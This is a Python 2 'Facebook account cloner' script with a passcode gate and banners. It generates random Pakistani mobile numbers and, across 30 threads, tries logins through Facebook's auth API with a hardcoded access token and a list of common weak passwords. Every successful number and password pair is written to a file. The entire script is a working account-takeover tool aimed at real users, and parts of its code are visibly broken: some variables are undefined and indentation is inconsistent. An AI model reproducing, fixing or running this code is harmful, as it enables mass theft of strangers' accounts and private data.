import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(30000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 All.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;93m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;94m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;96m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
\033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●━●
\033[1;91m██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
\033[1;92m██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
\033[1;93m██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
\033[1;94m██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
\033[1;95m██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
\033[1;96m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░
\033[1;91m◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○
                               without login command ( no need VPN )                                                  
"""

####Logo####

logo1 = """

____🌹🌸 🌾 💙▫⬜▫💙 🌾 🌸🌹
__🌾🌾💜💙☆💙::::::::💙☆💙💜🌾🌾
_🌹🌸💜💙___☆💙::💙☆.__💙💜🌸🌹
🌾🌾💜💙▫▫ ☆💙☆▫.💙💜🌾🌾
🌹🌸💜💙Always be Happy 
🌾🌾💜💙Have a Nice Time
_🌹🌸💜💙Take Care Dear 
__🌾🌾💜💙All Friends 
____🌹🌸💜💙
_____🌾🌾💜💙
_______🌹🌸💜💙
_________🌾🌾💜💙
___________🌹🌸💜💙
_____________🌾🌾💜💙
_______________🌹🌸💜💙
🌹🌹🌹🌹🌹🌹.🌹🌹💜💙
🌸🌸🌸🌸🌸🌸🌸🌸🌸💜💙
💜💜💜💜💜💜💜💜💜💜💜💙
💙💙💙💙💙💙💙💙💙💙💙💙💙                   
\x1b[3;90mFACEBOOK ACCOUNT CLONER BY \x1b[3;90mSOMI BRAND                                                                                                                                                                                                                                                                                                                                                                              
 """

logo2 = """,
\033[1;91m        ______     _    _     _              
\033[1;92m        | ___ \   | |  (_)   | |             
\033[1;93m        | |_/ /_ _| | ___ ___| |_ __ _ _ __  
\033[1;94m        |  __/ _` | |/ / / __| __/ _` | '_ \ 
\033[1;95m        | | | (_| |   <| \__ \ || (_| | | | |
\033[1;96m        \_|  \__,_|_|\_\_|___/\__\__,_|_| |_|
                                     
"""


CorrectPasscode = "Somi"
jalan(" 🔒🔒🔒 4 Digit PassCode Required To Enter 🔒🔒🔒")

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;97m[🔒] \x1b[1;97mEnter PassCode\x1b[1;92m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92m🔓🔓🔓Correct Entry✅✅✅
                  """
            jalan("...............with out login command(no need VPN)✅✅✅..........")
            loop = 'false'
    else:
            print "\033[1;91m🔒🔒🔒Wrong Entry!"
            os.system('xdg-open https://www.youtube.com/cannel/UCNx68447zLAljb_')
##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo1
        print "\033[4;30m[1]\x1b[3;93mClone All Pakistani Numbers Facebook Accounts."
        time.sleep(0.05)
        print '\x1b[4;30m[0]\033[3;91mExit.'
        time.sleep(0.05)
        pilih_login()

def pilih_login():
	bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
	os.system('clear')
	print logo1
	print '\x1b[3;93m[1] Start The Process'
	time.sleep(0.05)
	print '\x1b[1;93m[0] \033[3;92mGo Back To The Previous Menu'
        time.sleep(0.05)
	action()

def action():
	peak = raw_input('\n\033[1;91mChoose an Option:\033[1;97m')
	if peak =='':
		print '[!] Fill In Correctly'
		action()
	elif peak =="1":              
		os.system("clear")
		print logo2
		print "                \033[4;90mArea Codes With Networks"+'\n'
		print("\033[3;91mJazz    Pakistan: 00,01,02,03,04,05,06,07,08,09")+'\n'
		print("\033[3;92mZong    Pakistan: 10,11,12,13,14,15,16,17,18")+'\n'
		print("\033[3;93mWarid   Pakistan: 20,21,22,23,24")+'\n'
		print("\033[3;95mUfone   Pakistan: 30,31,32,33,34,35,36,37")+'\n'
		print("\033[3;96mTelenor Pakistan: 40,41,42,43,44,45,46,47,48,49")+'\n'
		try:
			c = raw_input("\033[1;91mChoose Area Code  : ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif peak =='0':
		login()
	else:
		print '[!] Fill In Correctly'
		action()
	print 48* '◈'
	jalan("\r\033[1;33;40m•◈•─•◈• Cloning Process Has Been Started...•◈•─•◈•\033[1;97m")
	time.sleep(0.05)
	jalan("\033[1;93m•◈─•◈•   To Stop The Process Press CTRl+Z...•◈─•◈•")
	time.sleep(0.05)
	xxx = str(len(id))
	jalan ('[✅] Total Numbers: '+xxx)
	jalan ("[✅] Trying Passwords Wait...")
	print 48* '◈'
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[3;92m[mafia-killer-hacked]  ' + k + c + user + '  |  ' + pass1
				okb = open('save/cloned.txt', 'a')
				okb.write(k+c+user+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[3;93m[open after 7 days] ' + k + c + user + '  |  ' + pass1
					cps = open('save/cloned.txt', 'a')
					cps.write(k+c+user+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786"
 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[3;92m[hacked]  ' + k + c + user +  '  |  ' + pass2
 				        okb = open('save/cloned.txt', 'a')
 				        okb.write(k+c+user+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[3;93m[open after 7 days] ' + k + c + user + '  |  ' + pass2
 					        cps = open('save/cloned.txt', 'a')
 					        cps.write(k+c+user+pass2+'\n')
 					        cps.close()
 					        cpb.append(c+user+pass2)
                                        else:
 				            pass3="Pakistan"
 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[3;92m[mafia-kilker-hacked]  ' + k + c + user + '  |  ' + pass3
 				                okb = open('save/cloned.txt', 'a')
 				                okb.write(k+c+user+pass3+'\n')
 				                okb.close()
 				                oks.append(c+user+pass3)
 				            else:
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[3;93m[open after 7 days] ' + k + c + user + '  |  ' + pass3
 					                cps = open('save/cloned.txt', 'a')
 					                cps.write(k+c+user+pass3+'\n')
 					                cps.close()
 					                cpb.append(c+user+pass3)
                                                else:
 				                    pass4="Pakistan786"
 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[3;92m[mafia-killer-hacked]  ' + k + c + user + '  |  ' + pass4
 				                        okb = open('save/cloned.txt', 'a')
 				                        okb.write(k+c+user+pass4+'\n')
 				                        okb.close()
 				                        oks.append(c+user+pass4)
 				                    else:
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[3;93m[open after 7 days] ' + k + c + user + '  |  ' + pass4
 					                        cps = open('save/cloned.txt', 'a')
 					                        cps.write(k+c+user+pass4+'\n')
 					                        cps.close()
 					                        cpb.append(c+user+pass4)
                                                        else:
 				                                       pass5="pakistan123"
 				                                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				                                       q = json.load(data)
 				                                       if 'access_token' in q:
 				                                          print '\x1b[3;92m[mafia-killer-hacked]  ' + k + c + user + '  |  ' + pass5
 				                                          okb = open('save/cloned.txt', 'a')
 				                                          okb.write(k+c+user+pass5+'\n')
 				                                          okb.close()
 				                                          oks.append(c+user+pass5)
                                                                       else:
                                                                       	if 'www.facebook.com' in q['error_msg']:
 					                                                    print '\033[3;93m[open after 7 days] ' + k + c + user + '  |  ' + pass5
 					                                                    cps = open('save/cloned.txt', 'a')
 					                                                    cps.write(k+c+user+pass5+'\n')
 					                                                    cps.close()
 					                                                    cpb.append(c+user+pass5)
 				                 							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50* '◈'
	print '[✅] Process Has Been Completed ...'
	print '[✅] Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
	print('[✅] Cloned Accounts Has Been Saved : save/cloned.txt')
	jalan("Instruction: Offline Accounts Will Open Between 7-15 Days")
	print 'ALLAH HAFIZ'
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()


